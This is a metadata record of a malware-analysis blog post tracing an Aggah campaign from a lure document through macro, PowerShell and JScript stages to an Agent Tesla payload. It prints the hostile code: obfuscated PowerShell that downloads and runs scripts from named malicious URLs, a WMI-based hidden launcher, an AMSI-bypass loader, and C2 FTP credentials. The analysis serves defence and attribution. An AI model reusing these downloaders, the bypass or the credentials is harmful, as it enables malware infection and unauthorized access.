{
    "id": "98546a9f-17a5-43b2-8faa-1a9abed1806e",
    "created_at": "2023-01-12T15:07:10.842722Z",
    "updated_at": "2025-03-27T02:12:13.851876Z",
    "deleted_at": null,
    "sha1_hash": "ddde687c3d41c62493ca1c459073347c6beb0112",
    "title": "2020-02-26 - (Ab)using bash-fu to analyze recent Aggah sample",
    "authors": "",
    "file_creation_date": "2022-05-28T04:04:49Z",
    "file_modification_date": "2022-05-28T04:04:49Z",
    "file_size": 244672,
    "plain_text": "# (Ab)using bash-fu to analyze recent Aggah sample\n\n**blog.malwarelab.pl/posts/basfu_aggah/**\n\n## Intro\n\n\nFebruary 26, 2020\n\n\n### Recently one of my generic signatures for malformed documents was hit, this type of malformation was used mostly by Zebrocy so i was curious whats cooking. After some analysis it turns out that last stage uses tools that are publicly attributed to Aggah, but to get that we need to tear through multiple layers of downloading scripts. We probably could just run our lure document and collect dropped binaries in a sandbox but where is fun of that? Let’s do some work and abuse bash in order to obtain next stages!\n\n## Lure document\n\n### File that cought my attention is 47625e693220465ced292aefd7c61fffc77dedd01618432da177a3b89525be9b uploaded with a name Updated Pre-Contract.docx from Honk Kong. File is broken its missing one byte and libreoffice refuses to open it, but we can easly fix that!\n```\n(cat /tmp/b93291c5560551ffd4e7f1545c07f403.bin ; printf \"\\x00\" ) > fix.doc\n\n and we are presented with very blurred jpg embedded in document\n\n we can also skip fixing phase and use 7zip to unpack content of the file, but we need screenshot of a doc right? ;]\n\n Anyhow looking into file with 7zip is always a good idea which may give a clue what to look for\n\n```\n\n-----\n\n```\nType = zip\nERRORS:\nUnexpected end of archive\nPhysical Size = 39441\n  Date   Time  Attr     Size  Compressed Name\n------------------- ----- ------------ ------------ -----------------------1980-01-01 00:00:00 .....     2017     414 [Content_Types].xml\n1980-01-01 00:00:00 .....     737     254 _rels/.rels\n1980-01-01 00:00:00 .....     3781     1146 word/document.xml\n1980-01-01 00:00:00 .....     1509     315 word/_rels/document.xml.rels\n1980-01-01 00:00:00 .....     8814     8814 word/media/image1.jpg\n1980-01-01 00:00:00 .....     6795     1571 word/theme/theme1.xml\n1980-01-01 00:00:00 .....     2938     1065 word/settings.xml\n1980-01-01 00:00:00 .....     213     151 customXml/item1.xml\n1980-01-01 00:00:00 .....     335     243 customXml/itemProps1.xml\n1980-01-01 00:00:00 .....    58402     7000 customXml/item2.xml\n1980-01-01 00:00:00 .....     1088     410 customXml/itemProps2.xml\n1980-01-01 00:00:00 .....     9799     1724 customXml/item3.xml\n1980-01-01 00:00:00 .....     486     292 customXml/itemProps3.xml\n1980-01-01 00:00:00 .....    31158     2054 word/numbering.xml\n1980-01-01 00:00:00 .....    55478     5110 word/styles.xml\n1980-01-01 00:00:00 .....     655     295 word/webSettings.xml\n1980-01-01 00:00:00 .....     2480     584 word/fontTable.xml\n1980-01-01 00:00:00 .....     746     373 docProps/core.xml\n1980-01-01 00:00:00 .....     997     476 docProps/app.xml\n1980-01-01 00:00:00 .....     1036     362 docProps/custom.xml\n1980-01-01 00:00:00 .....     296     194 customXml/_rels/item1.xml.rels\n1980-01-01 00:00:00 .....     296     194 customXml/_rels/item2.xml.rels\n1980-01-01 00:00:00 .....     296     195 customXml/_rels/item3.xml.rels\n2020-02-23 22:41:26 .....     369     224 word/_rels/settings.xml.rels\n------------------- ----- ------------ ------------ -----------------------2020-02-23 22:41:26       190721    33460 24 files\n\n### What stands out immediately is a date of word/_rels/settings.xml.rels so this doc is most likely abusing Ole2Link property to load remote content,\n$ extrOle2Link.py /tmp/b93291c5560551ffd4e7f1545c07f403.bin \n[!] broken zip - missing 1 bytes\n[+] HTTP-Ole2Link in http://office-archives.duckdns.org/cloud/clearance.rtf?raw=true in file word/_rels/settings.xml.rels\n\n And indeed it does. You can find this simple script here\n\n## RTF - clearance.rtf\n\n### We got a next stage 17a8d46df8cdf7db3f9996a25dce7c78abb0cef0d7d55d94d39caf880801466b . Lets look inside!\nid |index   |OLE Object                           \n---+----------+--------------------------------------------------------------0 |00002CADh |format_id: 2 (Embedded)                    \n  |     |class name: 'Excel.Sheet.8'                  \n  |     |data size: 39936                        \n  |     |MD5 = 'bf1d62dff81856a2784046b4d3eeab67'            \n  |     |CLSID: 00020820-0000-0000-C000-000000000046          \n  |     |Microsoft Microsoft Excel 97-2003 Worksheet (Excel.Sheet.8)  \n(...)\n---+----------+--------------------------------------------------------------9 |000F73F1h |format_id: 2 (Embedded)                    \n  |     |class name: 'Excel.Sheet.8'                  \n  |     |data size: 39936                        \n  |     |MD5 = 'bb74ebb70450688af0c862b46c427eec'            \n  |     |CLSID: 00020820-0000-0000-C000-000000000046          \n  |     |Microsoft Microsoft Excel 97-2003 Worksheet (Excel.Sheet.8)  \n---+----------+--------------------------------------------------------------\n Ugh a lot, but all of them contain the same macro,\n\n```\n\n-----\n\n```\n'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox\n'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox\n'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox\n'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox\nWorksheets(1).Activate\nA = Range(\"C3\").Comment.Text\ncv = StrReverse(Range(\"C4\").Comment.Text)\nCall CC0(A, cv)\nEnd Sub\nFunction CC0(Str, cv)\n'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox\nSet BMMMEWEUUERTRT = CreateObject(cv)\nBMMMEWEUUERTRT.Exec (StrReverse(Str))\nEnd Function\n\n### Here we should propably turn into python library that can view or manipulate xml files such as xlrd but this time we are lucky, applying\nstrings(1) on ole files quickly yields an powershell code\nllehS.tpircSW<\n)0,\"\"\")'sj.duolc\\'+ 'ATADPPA:vne$'(ssecorp-trats\n;XEI|')''sj.duolc\\''+''ATADPPA:vne$'',''sj.nitup/ADN/rg.wercsutats.www//:ptth''(e'+'liF'+'dao'+'ln'+'woD.'+')tne'+'ilC'+'beW'+'.t'+'\n +')*O'+'-W* '+'M'+'C'+'G('+'&(' llehsrewoP\"\"\"(nuR.t$;llehs.tpircsW moC- tcejbO-weN =t$ llehsrewop nim/ trats c/ dmc<\nWindows UserT\n\n after reversing string, we got proper code,\n<cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(\"\"\"Powershell '(&'+'(G'+'C'+'M'+' *W-'+'O*)'+\n'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\\cloud.js'')'|I\n start-process('$env:APPDATA' +'\\cloud.js')\"\"\",0)\n\n All of the OLE files have the same ps payload but we should verify that!\n<cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(\"\"\"Powershell '(&'+'(G'+'C'+'M'+' *W-'+'O*)'+\n'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\\cloud.js'')'|I\n start-process('$env:APPDATA' +'\\cloud.js')\"\"\",0)\n<cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(\"\"\"Powershell '(&'+'(G'+'C'+'M'+' *W-'+'O*)'+\n'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\\cloud.js'')'|I\n start-process('$env:APPDATA' +'\\cloud.js')\"\"\",0)\n<cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(\"\"\"Powershell '(&'+'(G'+'C'+'M'+' *W-'+'O*)'+\n'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\\cloud.js'')'|I\n start-process('$env:APPDATA' +'\\cloud.js')\"\"\",0)\n<cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(\"\"\"Powershell '(&'+'(G'+'C'+'M'+' *W-'+'O*)'+\n'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\\cloud.js'')'|I\n start-process('$env:APPDATA' +'\\cloud.js')\"\"\",0)\n<cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(\"\"\"Powershell '(&'+'(G'+'C'+'M'+' *W-'+'O*)'+\n'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\\cloud.js'')'|I\n start-process('$env:APPDATA' +'\\cloud.js')\"\"\",0)\n<cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(\"\"\"Powershell '(&'+'(G'+'C'+'M'+' *W-'+'O*)'+\n'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\\cloud.js'')'|I\n start-process('$env:APPDATA' +'\\cloud.js')\"\"\",0)\n<cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(\"\"\"Powershell '(&'+'(G'+'C'+'M'+' *W-'+'O*)'+\n'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\\cloud.js'')'|I\n start-process('$env:APPDATA' +'\\cloud.js')\"\"\",0)\n<cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(\"\"\"Powershell '(&'+'(G'+'C'+'M'+' *W-'+'O*)'+\n'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\\cloud.js'')'|I\n start-process('$env:APPDATA' +'\\cloud.js')\"\"\",0)\n<cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(\"\"\"Powershell '(&'+'(G'+'C'+'M'+' *W-'+'O*)'+\n'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\\cloud.js'')'|I\n start-process('$env:APPDATA' +'\\cloud.js')\"\"\",0)\n<cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(\"\"\"Powershell '(&'+'(G'+'C'+'M'+' *W-'+'O*)'+\n'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\\cloud.js'')'|I\n start-process('$env:APPDATA' +'\\cloud.js')\"\"\",0)\n\n## JScript - Putin.js\n\n### Next stage ( 854a0a9603b288cdf01fdcd0cc7feffb8393d35a80fca6ad981575cbe207aee4 ) is a JScript, lets take a look.\n\n```\n\n-----\n\n```\n[rahc[;)77,421,93,93,23,0mossad,501,mossad1,601,54,23,5mossad,4mossad,79,401,76,501,501,99,5mossad,79,63,23,16,301,0mossad,501,4moss\nf=f+\"63,23,16,23,801,mossad1,99,mossad1,6mossad,mossad1,4mossad,08,121,6mossad,501,4mossad,7mossad,99,101,38,85,85,39,4mossad,101,30\n nioj- 'X','E',)'I','#'(ecalper.'#'( K las\"\nAT(\"Powershell \" + REVERSE(replaceAll(f)))\nvar CurrentDirectory =WScript.ScriptFullName\nAT(\"Powershell \" +\"Remove-Item '\" + CurrentDirectory+\"'\")\nfunction AT(strCommand){\nvar strComputer = \".\";\n  var strCommand = strCommand;\n  var objWMIService = GetObject(\"winmgmts:\\\\\\\\\" + strComputer +\n\"\\\\root\\\\CIMV2\");\n  var objProcess = objWMIService.Get(\"Win32_Process\");\n  var objInParam =\nobjProcess.Methods_(\"Create\").inParameters.SpawnInstance_();\n  var objStartup =\nobjWMIService.Get(\"Win32_ProcessStartup\").SpawnInstance_();\n  objStartup.ShowWindow = 0;\n  objInParam.CommandLine = strCommand;\n  objInParam.ProcessStartupInformation = objStartup;\n   var objOutParams = objWMIService.ExecMethod( \"Win32_Process\",\n\"Create\", objInParam );\n}\nfunction replaceAll(str) {\n  return str.split(\"mossad\").join(\"11\");\n\n### This script will fire encoded powershell and clean all files dropped after it execution. Using WMI instead ordinarily spawning a cmd.exe is a nice addition. Whats inside encoded blob?\n$ cat putin.js | grep 'f=' | cut -d'\"' -f2 | tr -d \"\\n\" | sed -e's/mossad/11/g'|rev |cut -d';' -f2|cut -d'(' -f2 | tr -d \")\" | tr,\n\"\\n\" | while read a; do printf \\\\$(printf '%03o' $a); $a; done\n$Tbone='*EX'.replace('*','I');sal M $Tbone;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$p22 =\n[Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $p22;$t= New-Object\n-Com Microsoft.XMLHTTP;$t.open('GET','http://janvierassocies.fr/office/fact.jpg',$false);$t.send();$ty=$t.responseText;$asciiChars=\n$ty -split '-' |ForEach-Object {[char][byte]\"0x$_\"};$asciiString= $asciiChars -join ''|M\n\n Well another downloader.\n\n## Powershell - fact.jpg\n\n### fact.jpg ( 59012e676ed866ba013b1d950d1ef0558d7ea09e0a764ff65ee5b43663e918ea ) is just a text file with hex encoded powershell separated by dashes\n00000000: 3636 2d37 352d 3645 2d36 332d 3734 2d36 66-75-6E-63-74-6\n00000010: 392d 3646 2d36 452d 3230 2d35 352d 3445 9-6F-6E-20-55-4E\n00000020: 2d37 302d 3631 2d34 332d 3330 2d36 422d -70-61-43-30-6B00000030: 3333 2d33 332d 3333 2d33 332d 3333 2d33 33-33-33-33-33-3\n00000040: 302d 3330 2d33 302d 3330 2d33 312d 3331 0-30-30-30-31-31\n00000050: 2d33 342d 3337 2d33 352d 3335 2d33 352d -34-37-35-35-3500000060: 3230 2d37 422d 3044 2d30 412d 3044 2d30 20-7B-0D-0A-0D-0\n00000070: 412d 3039 2d35 422d 3433 2d36 442d 3634 A-09-5B-43-6D-64\n00000080: 2d36 432d 3635 2d37 342d 3432 2d36 392d -6C-65-74-42-6900000090: 3645 2d36 342d 3639 2d36 452d 3637 2d32 6E-64-69-6E-67-2\n\n lets decode it.\n$ cat fact.jpg | tr \"-\" \"\\n\" | while read n ; do chr $((16#$n)); done > x.ps1\n\n Here we need to cheat a little and abandon bash as its very slow to decode this big file (4.7MB) byte-by-byte. So we turn to python for help\ncat fact.jpg | python2 -c 'import sys; print \"\".join(map(lambda x: chr(int(x,16)),sys.stdin.read().split(\"-\")))' > x.ps1\n\n here is cleared code of the script\n\n```\n\n-----\n\n```\nfunction UNpaC0k3333300001147555 {\n     [CmdletBinding()]\n  Param ([byte[]] $byteArray)\n     Process {\n       Write-Verbose \"Get-DecompressedByteArray\"\n    $input = New-Object System.IO.MemoryStream(, $byteArray )\n       $output = New-Object System.IO.MemoryStream\n      $01774000 = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)\n  $puffpass = New-Object byte[](1024)\n  while($true){\n    $read = $01774000.Read($puffpass, 0, 1024)\n    if ($read -le 0){break}\n    $output.Write($puffpass, 0, $read)\n    }\n          [byte[]] $bout333 = $output.ToArray()\n    Write-Output $bout333\n  }\n}\n$t0='DEX'.replace('D','I');sal g $t0;[Byte[]]$MNB=('@!1F,@!8B,@!08,@!00,@!00...').replace('@!','0x'))| g;\n[Byte[]]$blindB=('@!1F,@!8B,@!08...').replace('@!','0x'))| g\n[byte[]]$deblindB = UNpaC0k3333300001147555 $blindB\n$blind=[System.Reflection.Assembly]::Load($deblindB)\n[Amsi]::Bypass()\n[byte[]]$decompressedByteArray = UNpaC0k3333300001147555 $MNB\n[Byte[]]$MNB2=('@!4D,@!5A...').replace('@!','0x'))| g\n$t=[System.Reflection.Assembly]::Load($decompressedByteArray)\n[rOnAlDo]::ChRiS('InstallUtil.exe',$MNB2)\n\n### This script will load into memory 3 binaries, two of them compressed one not, based on a script we can assume that the last one is the final payload and others are used for loading. Lets extract them.\ncat x.ps1 | grep 'blind' | head -n1 | cut -d \"'\" -f2 | sed -e 's/@!//g' | python2 -c 'import\nsys;sys.stdout.write(\"\".join(map(lambda x: chr(int(x,16)),sys.stdin.read().split(\",\"))))' |zcat - > amsi.bin\ncat x.ps1 | grep 'MNB' | head -n1 | cut -d \"'\" -f2 | sed -e 's/@!//g' | python2 -c 'import sys;sys.stdout.write(\"\".join(map(lambda\nx: chr(int(x,16)),sys.stdin.read().split(\",\"))))' |zcat - > loader.bin\ncat x.ps1 | grep 'MNB2' | head -n1 | cut -d \"'\" -f2 | sed -e 's/@!//g' | python2 -c 'import sys;sys.stdout.write(\"\".join(map(lambda\nx: chr(int(x,16)),sys.stdin.read().split(\",\"))))' > payload.bin\n\n## EndGame\n\n### Name Hash Type Comment\n\n```\n\n### amsi.bin e4d14ba73670184066a00cf5d3361580f6c4fbc5d0862a90278d82e95426faa5 PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n loader.bin 8ed29945294e0ba0ae9d5c94c3871dfb00eb9c32b2c7a7704005b31642977a02 PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n payload.bin 4cd35bcc7793a04daa0c20774ff2a60c3f1ae693964011cb34d13544dda8b500 PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows\n\n\n### Packed with ConfuserEx v1.0.0\n\n Packed with Unknown Obfuscator\n\n Packed with ConfuserEx\n\n\n### While dealing with .NET malware dnSpy is your best friend, and while it doesn’t have a flashy gui when used under Linux systems we can still use it to quickly asses whats going on using its console version and mono. After decompilation and looking into <Module>.cs file we can see a control flow obfuscation known as CFG flattening typical to ConfuserEX so lets remove it using modifed de4dot. Much better, but still nothing obvious to determine family and C2 address. At the top of the now cleared <Module>.cs we can see a decryption function\n\n\n-----\n\n```\n{\n    object[] array = <Module>.object_0;\n    if (Assembly.GetExecutingAssembly() == Assembly.GetCallingAssembly())\n    {\n        byte[] array2 = new byte[32];\n        byte[] array3 = new byte[16];\n        int num = int_0 >> 2;\n        num = num - 8 + 673 - 34893;\n        num = (num ^ 673 ^ 4398);\n        num -= 831;\n        num = (num - 673) / 8;\n        uint[] array4 = (uint[])array[num];\n        byte[] array5 = new byte[array4.Length * 4];\n        Buffer.BlockCopy(array4, 0, array5, 0, array4.Length * 4);\n        byte[] array6 = array5;\n        int num2 = array6.Length - 48;\n        byte[] array7 = new byte[num2];\n        Buffer.BlockCopy(array6, 0, array2, 0, 32);\n        Buffer.BlockCopy(array6, 32, array3, 0, 16);\n        Buffer.BlockCopy(array6, 48, array7, 0, num2);\n        return Encoding.UTF8.GetString(<Module>.smethod_1(array7, array2, array3));\n    }\n    return \"\";\n}\n// Token: 0x06000003 RID: 3 RVA: 0x00011150 File Offset: 0x0000F350\ninternal static byte[] smethod_1(byte[] byte_0, byte[] byte_1, byte[] byte_2)\n{\n    Rijndael rijndael = Rijndael.Create();\n    rijndael.Key = byte_1;\n    rijndael.IV = byte_2;\n    return rijndael.CreateDecryptor().TransformFinalBlock(byte_0, 0, byte_0.Length);\n}\n\n### and a huge blob of ints shortly after, lets make an educated guess and try to decode this blob.\ncat JKHLDqkYnadvWavArpqrFZCbXEpmNqbrFOBfl/\\<Module\\>.cs | grep -Pzo \"new uint\\[\\]\\n\\s+{[^}]+}\"| sed -e 's#.new uint..##' | tr -d\n'}' | tr -d u | sed -e 's/\\s*//' | tr \"\\n\" \" \" | sed -e \"s/{/\\n/g\"|tr -d \" \" | xargs -I{} python2 -c 'import sys,struct; from\nmlib.crypto import aes;unpad = lambda s: s[:-ord(s[len(s) - 1:])];e=\"\".join(map(lambda x:\nstruct.pack(\"I\",int(x)),sys.argv[1].split(\",\")));x=aes.decrypt(e[48:],e[:32],\"cbc\",None,e[32:48]);print unpad(x)' \"{}\" > \npayload.bin_strings\n\n You can find those strings here. In those strings we can find bunch of hints from which software this malware steales data from but mosty we can find informations about C&C server.\n...\nftp://ftp.metris3d.hu/\nseed@metris3d.hu\nTeam2318@\n...\n\n further examination of strings and code reveal its Agent Tesla.\n\n## Attribution\n\n### At that point i had no idea what I’m actually look at, so i start pivoting - Agent Tesla with confuser is way to generic but loader with a unknown packer can be something unique. If you look closely into Guwav/Properties/AssemblyInfo.cs you can find very strange definition\n[assembly:\nAssemblyTrademark(\"kernel32||CreateProcessA||GetThreadContext||Wow64GetThreadContext||SetThreadContext||Wow64SetThreadContext||ReadP\n\n this sounds like a great pivot! Indeed it is, soon after querying for\nmetadata:\"kernel32||CreateProcessA||GetThreadContext||Wow64GetThreadContext||SetThreadContext||Wow64SetThreadContext||R\n\n on VT we will find this\n\n```\n\n-----\n\n### While this is hardly any proof, its a hint for a direction. After examine the files from VT and the one described in Yoroi’s blog post and comparing to my loader i reached a conclusion that it is indeed the same one. However this loader can still be used by other parties, but while this campaign is quite different that the one previously described one can find some similarities such ash\n\n use of off the shelf .NET RAT heavy use of StrReverse in early stages Mixture of VBS, Powershell and JScript Way of encoding payload in later stages Consistent way of using ConfuserEX\n\n With all that in mind i would say with medium confidence that this is another campaign from Aggah stable\n\n## Conclusion\n\n### When dealing with a many script based droppers using bash tools such as grep, send and awk can be a tremendous help, and since most of those encodings are used in in one or two campaigns there is no real need to create tons of throw-away scripts. This static method of analysis is obviously more tedious and time consuming than throwing things into sandbox and just read the results it may reveal artifacts that would be missed in automated analysis. Artifacts such as childish use of putin and mossad keywords. Another curious thing that we would probably missed is password for ftp account, same password was mentioned in a PAN’s Unit42 blog post few years back, this password is unique enough to give a clue of possible history of the group or operator.\n\n## Analysis Artifacts - Hashes, domains, urls, etc\n\n\n-----\n\n```\nhttp://office-archives.duckdns.org/cloud/clearance.rtf\nhttp://www.statuscrew.gr/NDA/putin.js\nhttp://janvierassocies.fr/office/fact.jpg\nftp:///ftp.metris3d.hu/\nHASHES:\n47625e693220465ced292aefd7c61fffc77dedd01618432da177a3b89525be9b\n17a8d46df8cdf7db3f9996a25dce7c78abb0cef0d7d55d94d39caf880801466b\n854a0a9603b288cdf01fdcd0cc7feffb8393d35a80fca6ad981575cbe207aee4\n59012e676ed866ba013b1d950d1ef0558d7ea09e0a764ff65ee5b43663e918ea\ne4d14ba73670184066a00cf5d3361580f6c4fbc5d0862a90278d82e95426faa5\n8ed29945294e0ba0ae9d5c94c3871dfb00eb9c32b2c7a7704005b31642977a02\n4cd35bcc7793a04daa0c20774ff2a60c3f1ae693964011cb34d13544dda8b500\nFILE NAMES:\nUpdated Pre-Contract.docx\nInstallUtil.exe\ncloud.js\nclearance.rtf\nC2 LOGIN:\nseed@metris3d.hu\nTeam2318@\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-26 - (Ab)using bash-fu to analyze recent Aggah sample.pdf"
    ],
    "report_names": [
        "2020-02-26 - (Ab)using bash-fu to analyze recent Aggah sample.pdf"
    ],
    "threat_actors": [
        {
            "id": "28851008-77b4-47eb-abcd-1bb5b3f19fc2",
            "created_at": "2023-06-20T02:02:10.254614Z",
            "updated_at": "2025-03-27T02:00:03.130853Z",
            "deleted_at": null,
            "main_name": "Hagga",
            "aliases": [
                "TH-157",
                "Aggah"
            ],
            "source_name": "MISPGALAXY:Hagga",
            "tools": [
                "Agent Tesla"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b0d34dd6-ee90-483b-bb6c-441332274160",
            "created_at": "2022-10-25T16:07:23.296754Z",
            "updated_at": "2025-03-27T02:02:09.724313Z",
            "deleted_at": null,
            "main_name": "Aggah",
            "aliases": [
                "Operation Red Deer",
                "Operation Roma225"
            ],
            "source_name": "ETDA:Aggah",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "Aggah",
                "Atros2.CKPN",
                "Bladabindi",
                "Jorik",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "Negasteal",
                "Origin Logger",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "Warzone",
                "Warzone RAT",
                "ZPAQ",
                "Zurten",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536030,
    "ts_updated_at": 1743041533,
    "ts_creation_date": 1653710689,
    "ts_modification_date": 1653710689,
    "files": {
        "pdf": "https://archive.orkl.eu/ddde687c3d41c62493ca1c459073347c6beb0112.pdf",
        "text": "https://archive.orkl.eu/ddde687c3d41c62493ca1c459073347c6beb0112.txt",
        "img": "https://archive.orkl.eu/ddde687c3d41c62493ca1c459073347c6beb0112.jpg"
    }
}